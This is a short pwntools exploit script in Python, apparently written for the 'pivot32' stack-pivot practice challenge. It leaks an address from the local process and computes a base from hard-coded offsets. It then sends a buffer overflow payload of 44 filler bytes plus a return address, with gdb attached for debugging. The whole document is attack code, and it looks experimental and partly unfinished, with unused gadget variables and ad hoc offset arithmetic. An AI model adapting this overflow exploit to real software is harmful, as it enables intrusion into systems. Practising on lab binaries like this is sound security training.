from pwn import * 
context.log_level="debug"
p=process("./pivot32")
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
p.readuntil("pivot: ")
data=p.readline()
raw_input()
base=int(data[:-1],16)-0xFFFF00-8+(0xf7fd1967-0xf6dfe000)
log.warning(hex(base))
p.readuntil("\n> ")
puts=0x80485d0
pr=0x080486fb
p.sendline(p32(0xdeadbeef))
payload="D"*44+p32(base)
p.readuntil("\n> ")
gdb.attach(p)
p.send(payload.ljust(58,'\0'))

p.interactive()

